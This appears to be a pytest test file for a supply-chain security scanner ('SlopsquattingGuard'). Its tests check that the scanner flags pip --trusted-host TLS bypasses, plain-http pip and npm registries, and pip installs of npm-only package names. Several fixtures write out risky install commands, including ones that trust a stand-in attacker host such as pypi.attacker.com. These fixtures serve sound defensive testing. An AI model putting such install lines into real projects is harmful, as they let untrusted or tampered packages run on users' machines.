"""Tests for SlopsquattingGuard (SLOP-001–004, MLSC-016/021/022, SQ-085)."""
from __future__ import annotations

from agentsec.guards.slopsquatting import SlopsquattingGuard
from tests.guards._common import *  # noqa: F401,F403


def _both_prof(root: Path):
    # genuinely distinct: python + frontend in one profile (no _common canonical for this shape)
    return mkprofile(root, features={"python", "frontend"}, python_dirs=["."], frontend_dir=".")


# ---------------------------------------------------------------------------
# applies() gate
# ---------------------------------------------------------------------------

def test_slopsquatting_applies_to_python() -> None:
    prof = mkprofile(Path("/tmp"), features={"python"})
    assert SlopsquattingGuard().applies(prof) is True


def test_slopsquatting_applies_to_frontend() -> None:
    prof = mkprofile(Path("/tmp"), features={"frontend"})
    assert SlopsquattingGuard().applies(prof) is True


def test_slopsquatting_does_not_apply_to_empty_stack() -> None:
    prof = mkprofile(Path("/tmp"), features=set())
    assert SlopsquattingGuard().applies(prof) is False


# ---------------------------------------------------------------------------
# Rule 1 — MLSC-016: pip --trusted-host TLS bypass
# ---------------------------------------------------------------------------

def test_pip_trusted_host_fires_on_install_line(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "pip install --trusted-host pypi.attacker.com mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/pip-trusted-host-tls-bypass" in rules
    hit = next(f for f in findings if f.rule == "slopsquatting/pip-trusted-host-tls-bypass")
    assert hit.severity == "high"


def test_pip_trusted_host_fires_in_dockerfile(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12-slim\n"
        "RUN pip install --trusted-host 192.168.1.1 torch\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/pip-trusted-host-tls-bypass" in rules


def test_pip3_trusted_host_fires(tmp_path: Path) -> None:
    # Regression: `pip3 install` is the default spelling on many distros and must fire too.
    (tmp_path / "setup.sh").write_text(
        "pip3 install --trusted-host pypi.attacker.com mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "slopsquatting/pip-trusted-host-tls-bypass" for f in findings)


def test_pip3_install_safe_form_silent(tmp_path: Path) -> None:
    # FP-bait: a plain `pip3 install` of real PyPI packages carries no violation markers.
    (tmp_path / "setup.sh").write_text(
        "pip3 install requests flask\n",
        encoding="utf-8",
    )
    assert SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_pip3_cross_ecosystem_fires(tmp_path: Path) -> None:
    # Regression: the cross-ecosystem rule must also see `pip3 install react`.
    (tmp_path / "setup.sh").write_text(
        "pip3 install react requests\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_pip_trusted_host_silent_on_comment_line(tmp_path: Path) -> None:
    (tmp_path / "docs.txt").write_text(
        "# pip install --trusted-host pypi.attacker.com mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-trusted-host-tls-bypass" for f in findings)


def test_pip_trusted_host_silent_with_pragma(tmp_path: Path) -> None:
    (tmp_path / "setup.sh").write_text(
        "# security: allow-slopsquatting\n"
        "pip install --trusted-host pypi.internal mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-trusted-host-tls-bypass" for f in findings)


# ---------------------------------------------------------------------------
# Rule 2 — MLSC-022: Non-HTTPS pip index
# ---------------------------------------------------------------------------

def test_pip_http_index_fires_on_extra_index_url(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "pip install --extra-index-url http://my-repo.internal/simple/ mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/pip-http-index" in rules
    hit = next(f for f in findings if f.rule == "slopsquatting/pip-http-index")
    assert hit.severity == "high"


def test_pip_http_index_fires_on_index_url(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "--index-url http://internal.corp/simple/\nrequests==2.32.0\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/pip-http-index" in rules


def test_pip_https_index_is_silent(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "--extra-index-url https://download.pytorch.org/whl/cpu\ntorch\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-http-index" for f in findings)


def test_pip_http_index_silent_with_pragma(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "# security: allow-slopsquatting\n"
        "pip install --extra-index-url http://internal/simple/ mypackage\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-http-index" for f in findings)


# ---------------------------------------------------------------------------
# Rule 3 — MLSC-021: Cross-ecosystem pip install of npm-only packages
# ---------------------------------------------------------------------------

def test_cross_ecosystem_pip_fires_on_react(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "import subprocess\n"
        "subprocess.run(['pip', 'install', 'react', 'requests'])\n"
        "# inline: pip install react requests\n"
        "import os; os.system('pip install react requests')\n",
        encoding="utf-8",
    )
    # Use a script file so the regex over raw text fires
    (tmp_path / "setup.sh").write_text(
        "pip install react requests\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/cross-ecosystem-pip-install" in rules
    hit = next(f for f in findings if f.rule == "slopsquatting/cross-ecosystem-pip-install")
    assert hit.severity == "critical"
    assert "react" in hit.message


def test_cross_ecosystem_pip_fires_on_webpack_in_dockerfile(tmp_path: Path) -> None:
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12-slim\n"
        "RUN pip install webpack flask\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/cross-ecosystem-pip-install" in rules


def test_cross_ecosystem_pip_silent_for_real_pypi_packages(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "pip install requests flask fastapi pydantic sqlalchemy\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_cross_ecosystem_pip_silent_with_pragma(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "# security: allow-slopsquatting\n"
        "pip install react requests\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_cross_ecosystem_pip_silent_on_comment_line(tmp_path: Path) -> None:
    (tmp_path / "README.txt").write_text(
        "# Do NOT run: pip install react\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


# ---------------------------------------------------------------------------
# Rule 4 — SQ-085: npm / yarn non-HTTPS registry
# ---------------------------------------------------------------------------

def test_npm_http_registry_fires_in_npmrc(tmp_path: Path) -> None:
    (tmp_path / ".npmrc").write_text(
        "registry=http://internal.corp/npm/\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _frontend_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/npm-http-registry" in rules
    hit = next(f for f in findings if f.rule == "slopsquatting/npm-http-registry")
    assert hit.severity == "high"


def test_npm_https_registry_silent_in_npmrc(tmp_path: Path) -> None:
    (tmp_path / ".npmrc").write_text(
        "registry=https://registry.npmjs.org/\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _frontend_prof(tmp_path))
    assert not any(f.rule == "slopsquatting/npm-http-registry" for f in findings)


def test_npm_http_registry_fires_in_package_json(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{\n  "name": "myapp",\n  "publishConfig": {\n'
        '    "registry": "http://private.internal.npm/"\n  }\n}\n',
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _frontend_prof(tmp_path))
    rules = {f.rule for f in findings}
    assert "slopsquatting/npm-http-registry" in rules


def test_npm_http_registry_silent_with_pragma(tmp_path: Path) -> None:
    (tmp_path / ".npmrc").write_text(
        "# security: allow-slopsquatting\n"
        "registry=http://internal.corp/npm/\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _frontend_prof(tmp_path))
    assert not any(f.rule == "slopsquatting/npm-http-registry" for f in findings)


# ── FP-bait regressions (review fixes) ───────────────────────────────────────

def test_cross_eco_silent_on_legit_pypi_babel(tmp_path: Path) -> None:
    """Babel is a mainstream Python i18n library — pip install babel must NOT fire."""
    (tmp_path / "Dockerfile").write_text("RUN pip install babel sphinx\n", encoding="utf-8")
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_cross_eco_silent_on_hyphenated_name(tmp_path: Path) -> None:
    """An npm name appearing only as a substring of a real PyPI package must NOT fire."""
    (tmp_path / "Dockerfile").write_text(
        "RUN pip install django-react-templatetags pytest-vite\n", encoding="utf-8")
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_cross_eco_silent_on_requirements_file_name(tmp_path: Path) -> None:
    """`pip install -r react-reqs.txt` must NOT fire — the npm name is a flag arg, not a target."""
    (tmp_path / "Dockerfile").write_text("RUN pip install -r react-reqs.txt\n", encoding="utf-8")
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_cross_eco_fires_on_versioned_target(tmp_path: Path) -> None:
    """A version-pinned npm-only target still fires (tokeniser strips the spec)."""
    (tmp_path / "Dockerfile").write_text("RUN pip install react==18.2.0\n", encoding="utf-8")
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "slopsquatting/cross-ecosystem-pip-install" for f in findings)


def test_http_index_silent_in_comment(tmp_path: Path) -> None:
    """A commented-out example http index line must NOT fire (Rule 2 comment skip)."""
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\n# pip install --extra-index-url http://example.com/simple foo\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-http-index" for f in findings)


def test_http_index_silent_on_loopback(tmp_path: Path) -> None:
    """A local devpi index over http://127.0.0.1 carries no MitM risk — must NOT fire."""
    (tmp_path / "install.sh").write_text(
        "pip install --index-url http://127.0.0.1:3141/root/pypi/ mypkg\n",
        encoding="utf-8",
    )
    findings = SlopsquattingGuard().run(tmp_path, _pyprof(tmp_path))
    assert not any(f.rule == "slopsquatting/pip-http-index" for f in findings)


def test_npm_http_registry_silent_on_loopback(tmp_path: Path) -> None:
    """A local verdaccio registry over http://localhost must NOT fire."""
    (tmp_path / ".npmrc").write_text("registry=http://localhost:4873/\n", encoding="utf-8")
    findings = SlopsquattingGuard().run(tmp_path, _frontend_prof(tmp_path))
    assert not any(f.rule == "slopsquatting/npm-http-registry" for f in findings)
